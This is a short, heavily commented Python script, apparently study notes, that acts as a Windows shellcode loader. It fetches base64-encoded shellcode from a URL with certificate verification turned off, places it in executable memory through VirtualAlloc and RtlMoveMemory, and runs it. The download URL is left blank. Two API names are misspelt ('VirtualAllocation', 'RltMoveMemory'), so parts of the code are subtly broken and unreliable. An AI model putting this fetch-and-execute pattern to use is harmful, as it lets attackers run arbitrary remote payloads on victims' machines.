from urllib import request
'''Comes pre-installed with Python
Verbose and less intuitive
Doesnot handle things like redirects, sessions, or cookies easily
Good for basic one-off HTTP GET/POST requests'''
import base64
import ctypes
import ssl

kernel32 = ctypes.windll.kernel32
#ctypes -> windll(creates a callable object for windows's dll) -> kernel32(Windows system DLL that provides access to fundamental operating system functions)

def get_code(url):
    
    context = ssl._create_unverified_context()
    context.set_ciphers('DEFAULT:@SECLEVEL=1')
    '''Created an SSL context with ssl._create_unverified_context() and set set_ciphers('DEFAULT:@SECLEVEL=1') to allow weak DH keys.'''
    
    with request.urlopen(url,context=context) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    
    length = len(buf)
    kernel32.VirtualAllocation.restype = ctypes.c_void_p
    #VirtualAlloc is a Windows API function that reserves, commits, or changes the state of a region of memory in the virtual address space of the calling process.
    
    kernel32.RltMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    '''Sets the argument types (argtypes) for the RtlMoveMemory function from kernel32.dll to a tuple of three types:
    ctypes.c_void_p: The destination memory address (a pointer to where data will be copied).
    ctypes.c_void_p: The source memory address (a pointer to the data to copy).
    ctypes.c_size_t: The number of bytes to copy (a size type, typically an unsigned integer).
    '''
    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40)#Allocating memory
    kernel32.RtlMoveMemory(ptr,buf,length)#Writing raw bytes to that memory
    #copies length bytes from buf (Python bytes object or pointer) to ptr (your allocated memory).
    
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    
    ptr = write_memory(buffer)
    
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = ""
    shellcode = get_code(url)
    run(shellcode)    
    
    